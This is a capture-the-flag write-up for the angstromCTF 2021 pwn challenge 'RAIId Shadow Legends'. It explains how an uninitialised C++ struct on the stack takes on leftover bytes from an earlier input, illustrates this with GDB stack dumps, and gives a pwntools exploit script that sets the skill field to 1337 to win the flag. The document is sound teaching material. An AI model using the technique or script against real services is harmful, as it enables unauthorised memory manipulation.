---
layout: post
title:  "RAIId Shadow Legends - Pwn"
date:   2021-04-09 12:28:05 +0100
categories: writeups
---

```
Challenge: RAIId Shadow Legends
Author: Ve
Description: C++ RAII in action
CTF: angstromCTF 2021
Category: Pwn
```

# Challenge description
> I love how C++ initializes everything for you. It makes things so easy and fun! <br>
> Speaking of fun, play our fun new game RAIId Shadow Legends <br>
> (source) at /problems/2021/raiid_shadow_legends on the shell server, or connect with nc shell.actf.co 21300. <br> <br>
> Hint: Resource acquisition is initialization, so everything I acquired should be initialized, right? <br> <br> <br>


# Analysis
```raiid_shadow_legends.cpp``` and ```raiid_shadow_legends (executable)``` are provided. <br> <br>

The binary is made up of a struct <br>
```
struct character {
    int health;
    int skill;
    long tokens;
    string name;
};
```
<br>

and three functions: <br>
- ```void play``` <br>
- ```void terms_and_conditions``` <br>
- ```int main```. <br> <br>

Due to RAII principles, everything that the program acquires is initialized and in the code there are no initialization, only declarations. <br> <br>

The codeflow is simple and obliged: <br>
- ```main``` -> ```terms_and_conditions``` -> ```play```. <br>
The function ```play``` prints the flag, under certain conditions. <br> <br>

In order to proceed further from the ```main``` function, we must input ```1```. <br>
```terms_and_conditions``` declares two strings, ```agreement``` and ```signature```,  and requires them in input. <br>
To proceed further, the only constraint is that we input ```yes``` when asked for the agreement.  <br>
```play``` declares a string ```action``` and a struct character ```player```. <br>
It asks for a name (```player.name```) and repeatedly asks for an action (```action```) to perform. <br> 
action 1 and 3 are completely useless, and the second one prints the flag if and only if the ```player.skill``` field is set to ```1337```. <br> <br>

There is no intended way in which we can change ```player.skill``` value. <br>
We can't manipulate it by overflowing the stack since the inputs are all managed by c++ strings, <br>
but ```player.skill```, along the others variables, is allocated on the stack. <br> <br>

We run ```gdb raiid_shadow_legends``` and give this commands: <br>
```
break *terms_and_conditions+246
break *terms_and_conditions+273
break *play+395
define hook-stop
x/30wx $rsp
end
```

> NOTE: ```continue``` instruction will not be part of this writeup <br> <br>
 
It prompts for the action, and we input ```1``` <br>
We can see that, after the first breakpoint, the stack contains the following values: <br>
```
0x7fffffffdf10: 0xffffdf20      0x00007fff      0x00000000      0x00000000
0x7fffffffdf20: 0x00000000      0x00000000      0xf7f1d97a      0x00007fff
0x7fffffffdf30: 0xffffdf40      0x00007fff      0x00000000      0x00000000
0x7fffffffdf40: 0xffffdf00      0x00007fff      0x55555140      0x00005555
0x7fffffffdf50: 0x00000000      0x00000000      0x733bfa00      0x8f838232
0x7fffffffdf60: 0x55556082      0x00005555      0x00000000      0x00000000
0x7fffffffdf70: 0xffffdfc0      0x00007fff      0x55555856      0x00005555
0x7fffffffdf80: 0xffffdf90      0x00007fff      0x00000001      0x00000000
0x7fffffffdf90: 0x00000031      0x00000000      0x00000000      0x00000000
```
> NOTE: You can see the ```1``` (```0x00000031```) at address ```0x7fffffffdf90```<br> <br>

It prompts for the agreement, and we input ```AAAAAAAA```, which is ```0x41414141 0x41414141```, and never forget ```\x00``` <br>
```
0x7fffffffdf10: 0xffffdf20      0x00007fff      0x00000000      0x00000000
0x7fffffffdf20: 0x41414141      0x41414141      0xf7f1d900      0x00007fff
0x7fffffffdf30: 0xffffdf40      0x00007fff      0x00000000      0x00000000
0x7fffffffdf40: 0xffffdf00      0x00007fff      0x55555140      0x00005555
0x7fffffffdf50: 0x00000000      0x00000000      0x733bfa00      0x8f838232
0x7fffffffdf60: 0x55556082      0x00005555      0x00000000      0x00000000
0x7fffffffdf70: 0xffffdfc0      0x00007fff      0x55555856      0x00005555
0x7fffffffdf80: 0xffffdf90      0x00007fff      0x00000001      0x00000000
0x7fffffffdf90: 0x00000031      0x00000000      0x00000000      0x00000000
```
> NOTE: You can see our input at address ```0x7fffffffdf20``` and ```0x7fffffffdf24``` <br> <br>

In order to proceed further, we must input ```yes```, and so we do. <br>
```
0x7fffffffdf10: 0xffffdf20      0x00007fff      0x00000000      0x00000000
0x7fffffffdf20: 0x00736579      0x41414141      0xf7f1d900      0x00007fff
0x7fffffffdf30: 0xffffdf40      0x00007fff      0x00000000      0x00000000
0x7fffffffdf40: 0xffffdf00      0x00007fff      0x55555140      0x00005555
0x7fffffffdf50: 0x00000000      0x00000000      0x733bfa00      0x8f838232
0x7fffffffdf60: 0x55556082      0x00005555      0x00000000      0x00000000
0x7fffffffdf70: 0xffffdfc0      0x00007fff      0x55555856      0x00005555
0x7fffffffdf80: 0xffffdf90      0x00007fff      0x00000001      0x00000000
0x7fffffffdf90: 0x00000031      0x00000000      0x00000000      0x00000000
```
```yes``` bytes (```\x79\x65\x73\x00```) overridden the first four As. They are reversed because the binary is little endian. <br> <br>

It prompts for the signature, our name and the action, we enter ```BBBB```, ```CCCC```, and ```DDDD``` respectively. <br>
It says  <br>
> Welcome, CCCC. Skill level: 1094795585 <br> <br>

> NOTE: (```1094795585``` is the decimal for ```0x41414141```) <br> <br>

It looks like we can control ```player.health``` values by ```agreement```! <br> <br>

# Solution

Now, take a look at the struct again: <br>
```
struct character {
    int health; // This field is 4 bytes long
    int skill; // This field is 4 bytes long
    long tokens; // This field is 8 bytes long
    string name; // This field is whatever bytes long (Seriously, check this out: https://shaharmike.com/cpp/std-string/)
};
```
In order to understand how values are handled, we're going to input just enough to fill (when prompted for the agreement):
- ```int character.health``` <br>
- ```int character.skill``` <br>
- ```long character.tokens```. <br>

So, 16 bytes, 16 chars. (Actually, 15 + ```\x00```) <br>
Therefore, our input will be something recognizable and 15 chars long: <br>
```AAAABBBBCCCCDDD```, which is: ```0x41414141 0x42424242 0x43434343 0x00444444``` (remember? architecture is ```amd64-64-little```!)<br>

Now let's look at the stack:
```
0x7fffffffdf10: 0xffffdf20      0x00007fff      0x0000000f      0x00000000
0x7fffffffdf20: 0x41414141      0x42424242      0x43434343      0x00444444
0x7fffffffdf30: 0xffffdf40      0x00007fff      0x00000000      0x00000000
0x7fffffffdf40: 0xffffdf00      0x00007fff      0x55555140      0x00005555
0x7fffffffdf50: 0x00000000      0x00000000      0x733bfa00      0x8f838232
0x7fffffffdf60: 0x55556082      0x00005555      0x00000000      0x00000000
0x7fffffffdf70: 0xffffdfc0      0x00007fff      0x55555856      0x00005555
0x7fffffffdf80: 0xffffdf90      0x00007fff      0x00000001      0x00000000
0x7fffffffdf90: 0x00000031      0x00000000      0x00000000      0x00000000
```
> NOTE: You can see our input at address ```0x7fffffffdf20```
<br> <br>

In order to proceed further, we must input ```yes```, and so we do. <br>
```
0x7fffffffdf10: 0xffffdf20      0x00007fff      0x0000000f      0x00000000
0x7fffffffdf20: 0x00736579      0x42424242      0x43434343      0x00444444
0x7fffffffdf30: 0xffffdf40      0x00007fff      0x00000000      0x00000000
0x7fffffffdf40: 0xffffdf00      0x00007fff      0x55555140      0x00005555
0x7fffffffdf50: 0x00000000      0x00000000      0x733bfa00      0x8f838232
0x7fffffffdf60: 0x55556082      0x00005555      0x00000000      0x00000000
0x7fffffffdf70: 0xffffdfc0      0x00007fff      0x55555856      0x00005555
0x7fffffffdf80: 0xffffdf90      0x00007fff      0x00000001      0x00000000
0x7fffffffdf90: 0x00000031      0x00000000      0x00000000      0x00000000
```
> Note: ```yes``` bytes (```\x00\x73\x65\x79```) overridden the first four As. <br> <br>
<br> <br>

It prompts for the signature, our name and the action, we enter ```EEEE``` (```0x45454545```), ```FFFF``` (```0x46464646```), and ```GGGG``` (```0x47474747```) respectively. <br>
It says  <br>
> Welcome, FFFF. Skill level: 1111638594 <br> <br>

> NOTE: (```1111638594``` is the decimal for ```0x42424242```) <br> <br>

The stack: <br>
```
0x7fffffffdf00: 0xffffdf10      0x00007fff      0x00000004      0x00000000
0x7fffffffdf10: 0x47474747      0x00007f00      0x00000003      0x00000000
0x7fffffffdf20: 0x00736579      0x42424242      0x43434343      0x00444444
0x7fffffffdf30: 0xffffdf40      0x00007fff      0x00000004      0x00000000
0x7fffffffdf40: 0x46464646      0x00007f00      0x55555140      0x00005555
0x7fffffffdf50: 0x00000000      0x00000000      0x3a852500      0x9d41160a
0x7fffffffdf60: 0x55556082      0x00005555      0x00000000      0x00000000
0x7fffffffdf70: 0xffffdfc0      0x00007fff      0x5555585b      0x00005555
0x7fffffffdf80: 0xffffdf90      0x00007fff      0x00000001      0x00000000
0x7fffffffdf90: 0x00000031      0x00000000      0x00000000      0x00000000
```
> Note: The signature ```EEEE``` (```0x45454545```) is overridden in the moment in which we input other values <br>
> Note: The name ```FFFF``` (```0x46464646```) is at ```0x7fffffffdf40``` <br>
> Note: The action ```GGGG``` (```0x47474747```) is at ```0x7fffffffdf10``` <br>

It's just how the stack works, but there's more! Why doesn't the ```string``` start when the ```long``` ends? <br>
The answer is that padding is added to satisfy alignment constraints! <br>
It's rare to have a struct with a ```sizeof``` equal to the sum of ```sizeof``` of each member. <br> <br>

We see no other ```0x42424242``` other that the ones we gave, so our hypothesis is confirmed! <br>

# Exploit

If we replace the ```0x42424242``` with the hex values of ```1337```, we will win!

```
import pwn

r = pwn.remote("shell.actf.co", 21300) # Open connection
	
r.recvuntil("do? ") # MAIN: action
r.sendline(b"1")

r.recvuntil("conditions? ") # TERMS_AND_CONDITIONS: agreement
r.sendline(b"AAAA" + pwn.p32(1337)) # b'AAAA9\x05\x00\x00'

r.recvuntil("conditions? ") # TERMS_AND_CONDITIONS: agreement
r.sendline(b"yes")

r.recvuntil("here: ") # TERMS_AND_CONDITIONS: signature
r.sendline(b"Ve")

r.recvuntil("name: ") # PLAY: name
r.sendline(b"Ve")

r.recvuntil("do? ") # PLAY: action
r.sendline(b"2")

print(r.recvline().decode().strip()) # PLAY: flag

r.close()
```

# Exploit output

```It's a tough battle, but you emerge victorious. The flag has been recovered successfully: actf{great_job!_speaking_of_great_jobs,_our_sponsor_audible...}```
